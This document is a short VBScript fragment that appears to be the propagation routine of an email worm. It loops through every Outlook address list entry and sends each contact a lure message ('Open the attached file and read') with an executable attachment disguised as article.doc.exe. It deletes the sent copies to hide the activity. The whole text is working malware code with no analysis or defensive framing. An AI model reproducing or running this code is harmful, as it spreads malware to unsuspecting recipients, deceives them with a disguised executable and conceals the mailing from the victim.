On Error Resume Next
Set sf=CreateObject("Scripting.FileSystemObject")
Set sys=sf.GetSpecialFolder(1)
Set OA=CreateObject("Outlook.Application")
Set MA=OA.GetNameSpace("MAPI")
For Each C In MA.AddressLists
If C.AddressEntries.Count <> 0 Then
For D=1 To C.AddressEntries.Count
Set AD=C.AddressEntries(D)
Set EM=OA.CreateItem(0)
EM.To=AD.Address
EM.Subject="Hi "&AD.Name&" read this."
body="I found this on the web and it is important."
body = body & VbCrLf & "Open the attached file and read."
EM.Body=body
EM.Attachments.Add(sys&"\article.doc.exe")
EM.DeleteAfterSubmit=True
If EM.To <> "" Then
EM.Send
End If
Next
End If
Next
